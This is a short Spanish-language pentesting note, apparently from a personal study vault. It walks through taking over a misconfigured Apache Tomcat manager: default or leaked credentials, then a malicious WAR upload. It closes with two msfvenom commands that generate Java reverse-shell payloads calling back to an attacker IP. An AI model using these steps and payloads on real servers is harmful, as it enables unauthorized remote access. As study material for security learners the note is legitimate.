
---
Es un tipo de servidor apache que es vulnerable y se puede explotar de la siguiente manera:

 - En la enumeración del sistema con nmap el nombre del servidor es *Apache tomcat*, puede correr en varios puertos pero en general se le ve en el puerto 8080 

1. Generalmente esto es lo que se muestra cuando no esta configurado :

![[Pasted image 20251020214113.png]]

- Aqui seleccionaremos el panel manager webapp para que aparezca un panel de login similar al siguiente

![[Pasted image 20251020214736.png]]

##### Muchas veces en el mensaje de error salen las credenciales como a continuación:

![[Pasted image 20251020214844.png]]

##### En internet podríamos buscar lo siguiente *Apache tomcat default Credentials Hackticks* para buscar credenciales por defecto que tiene el servidor, algunas de ellas son:

  ![[Pasted image 20251020214345.png]]

##### Una vez entremos al panel de administración del tomcat podremos ir a algún apartado de subida de archivos como el siguiente y subir un archivo malicioso:

![[Pasted image 20251020215119.png]]

El archivo malicioso que se suele subir es de java y con estos códigos en [[1. MsfVenom]]  podremos generar sus respectivas revershell:

```bash
msfvenom -p java/shell_reverse_tcp LHOST=<IpAtacante> LPORT=443 -f war -o reverse1.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IpAtacante> LPORT=443 -f war -o reverse2.war

# Debemos probar ambos payloads porque dependiendo el tomcat  suelen ser diferentes revershell

```

